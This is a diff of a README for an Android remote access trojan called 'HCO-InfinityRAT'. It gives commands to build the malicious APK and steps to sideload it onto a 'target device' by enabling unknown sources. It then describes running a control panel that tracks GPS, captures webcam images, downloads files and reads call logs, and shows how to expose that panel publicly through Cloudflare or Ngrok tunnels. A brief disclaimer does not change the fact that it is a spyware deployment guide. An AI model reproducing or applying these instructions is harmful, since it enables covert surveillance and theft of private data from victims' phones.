@@ -26,106 +26,121 @@
 
 Clone the repository:
 
-git clone https://github.com/Hackerscolonyofficial/HCO-InfinityRAT-Final  
+```bash
+git clone https://github.com/Hackerscolonyofficial/HCO-InfinityRAT-Final
 cd HCO-InfinityRAT-Final
+```
 
-Update Termux packages and install dependencies:
+Install Termux dependencies:
 
-pkg update && pkg upgrade -y  
-pkg install python git openjdk-17 apktool -y  
+```bash
+pkg update && pkg upgrade -y
+pkg install python git openjdk-17 apktool -y
 pip install flask
+```
 
 Build the APK:
 
+```bash
 python apk_builder.py
+```
 
-The generated APK will be saved at:
+APK Output Location:
 
+```
 output/HCO-InfinityRAT.apk
+```
 
 ---
 
 ## 📱 Installing and Running the APK on Target Device
 
-1. Transfer the APK to your Android device via USB, Bluetooth, or any file transfer method.
-
-2. On the Android device, use any file manager app (e.g., “Files” by Google, “ES File Explorer,” or your device’s built-in manager).
-
-3. Navigate to the folder where you transferred the APK. Common folders are:  
-- **Download/**  
-- **Bluetooth/**  
-- **Documents/**  
-- Or the folder you saved the APK in.
-
-4. Tap on `HCO-InfinityRAT.apk` to start the installation process.  
-(Enable “Install from Unknown Sources” or “Allow from this source” if prompted in Settings.)
-
-5. After installation, open the app to activate RAT functionalities.
+1. Transfer the APK to your phone using USB, Bluetooth, or file-sharing apps.  
+2. Open any File Manager app and navigate to:
+   - **Download/**
+   - **Bluetooth/**
+   - **Documents/**
+   - Or wherever you placed the APK.
+3. Tap `HCO-InfinityRAT.apk` and install it.  
+4. Allow unknown sources if prompted.  
+5. Open the app after installation to activate.
 
 ---
 
 ## 🧠 Using the Tool in Termux
 
-1. Start the Flask control server in Termux:
+Start the Flask control panel:
 
+```bash
 python main.py
+```
 
-2. Open your Android device browser (or PC browser if using a tunnel) and visit:
+Open a browser and go to:
 
+```
 http://localhost:22533
+```
 
-3. Use the web control panel to:
-
-- View real-time GPS location  
-- Capture images from the webcam  
-- Browse and download files  
-- Access call logs  
+You can now:
+- 🌍 Track GPS  
+- 📷 Capture webcam  
+- 📂 Browse & download files  
+- 📞 Read call logs  
 
 ---
 
-## 🌐 Exposing Server with Tunnel (Cloudflare / Ngrok)
+## 🌐 Make Panel Public (Tunnel)
 
-If you want to access the control panel outside your local network, use a tunneling service:
+### Option 1: Cloudflare Tunnel
 
-### Cloudflare Tunnel
-
-Install Cloudflared:
-
+```bash
 pkg install cloudflared -y
-
-Run the tunnel:
-
 python tunnel.py
+```
 
-Follow the Cloudflare URL displayed to access your server remotely.
+Use the URL shown to access from anywhere.
 
 ---
 
-### Ngrok Tunnel
+### Option 2: Ngrok
 
-1. Download and install Ngrok (visit https://ngrok.com for instructions).
+1. Install from https://ngrok.com  
+2. Start server:
 
-2. Start your Flask server (python main.py).
+```bash
+python main.py
+```
 
-3. Run Ngrok to expose port 22533:
+3. Then tunnel it:
 
+```bash
 ngrok http 22533
+```
 
-4. Use the Ngrok URL provided to remotely access your control panel.
+Use the URL shown in terminal.
+
+---
+
+## 🔐 Access Key System
+
+To use the tool, an **Access Key** is required.  
+👉 Contact on **Telegram** or **WhatsApp: +91 8420611159**  
+**Subscribe to our YouTube channel & DM for the key.**  
+Without the key, the tool **will not function**.
 
 ---
 
 ## ⚠️ Disclaimer
 
 This tool is for **educational and authorized testing purposes only**.  
-Do **NOT** use it on devices you do not own or have explicit permission to test.  
-The creator (Azhar) and Hackers Colony Official are **not responsible** for any misuse.
+Do **NOT** use it on unauthorized devices.  
+Azhar and Hackers Colony Official are **not responsible** for any misuse.
 
 ---
 
 ## 📄 License
 
-Licensed under the MIT License. See the LICENSE file for more info.
+Licensed under the MIT License.
 
 ---
 
